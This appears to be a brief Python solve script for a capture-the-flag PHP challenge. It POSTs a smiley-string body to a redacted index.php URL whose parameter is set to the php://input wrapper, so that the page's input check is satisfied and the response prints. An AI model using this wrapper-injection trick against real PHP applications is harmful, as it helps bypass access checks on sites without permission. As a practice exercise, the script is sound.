#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Date: 2017/03/08
# Created by FireEgret

from urllib import request,parse

url='xxxxx/index.php?^.^=php://input'

req=request.Request(url)

smile=bytes(parse.unquote('%28%E2%97%8F%27%E2%97%A1%27%E2%97%8F%29'),encoding='utf-8')

with request.urlopen(req,data=smile) as f:
    print(f.read().decode('utf-8'))